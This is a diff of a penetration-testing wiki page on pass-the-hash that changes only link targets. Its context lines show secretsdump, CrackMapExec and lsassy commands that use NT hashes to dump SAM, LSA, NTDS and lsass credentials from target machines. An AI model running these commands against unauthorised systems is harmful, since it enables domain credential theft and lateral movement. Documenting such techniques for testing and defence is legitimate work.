@@ -14,7 +14,7 @@ There are many tools that implement pass-the-hash: [Impacket scripts](https://gi
 
 {% tabs %}
 {% tab title="Credentials dumping" %}
-The Impacket script [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python) has the ability to remotely dump hashes and LSA secrets from a machine (`LMhash` can be empty) (see [dumping credentials from registry hives](../credentials/dumping/#windows-computer-registry-hives)).
+The Impacket script [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python) has the ability to remotely dump hashes and LSA secrets from a machine (`LMhash` can be empty) (see [dumping credentials from registry hives](../credentials/dumping/sam-and-lsa-secrets.md)).
 
 ```bash
 secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
@@ -22,7 +22,7 @@ secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
 secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
 ```
 
-[CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](../credentials/dumping/#windows-computer-registry-hives)).
+[CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](../credentials/dumping/sam-and-lsa-secrets.md)).
 
 ```bash
 crackmapexec smb $TARGETS -u $USER -H $NThash --sam --local-auth
@@ -30,7 +30,7 @@ crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --lsa
 crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --ntds
 ```
 
-[Lsassy](https://github.com/Hackndo/lsassy) (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [CrackMapExec](https://github.com/mpgn/CrackMapExec) module (see [dumping credentials from lsass process memory](../credentials/dumping/#windows-computer-lsass-exe)).
+[Lsassy](https://github.com/Hackndo/lsassy) (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [CrackMapExec](https://github.com/mpgn/CrackMapExec) module (see [dumping credentials from lsass process memory](../credentials/dumping/lsass.md)).
 
 ```bash
 crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
